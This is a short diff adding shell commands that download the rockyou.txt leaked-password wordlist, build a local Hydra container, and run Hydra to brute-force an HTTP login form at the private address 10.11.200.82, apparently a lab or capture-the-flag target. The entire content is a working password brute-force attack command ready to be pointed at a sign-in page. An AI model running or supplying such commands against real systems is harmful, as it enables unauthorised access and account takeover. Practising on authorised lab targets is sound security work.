@@ -1,0 +1,11 @@
+wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+
+docker build -t hydra-local .
+
+
+docker run --rm hydra-local \
+  -L /usr/share/wordlists/users.txt \
+  -P /usr/share/wordlists/rockyou.txt \
+  10.11.200.82 http-get-form \
+  "/:page=signin&username=^USER^&password=^PASS^&Login=Login:WrongAnswer.gif"
+
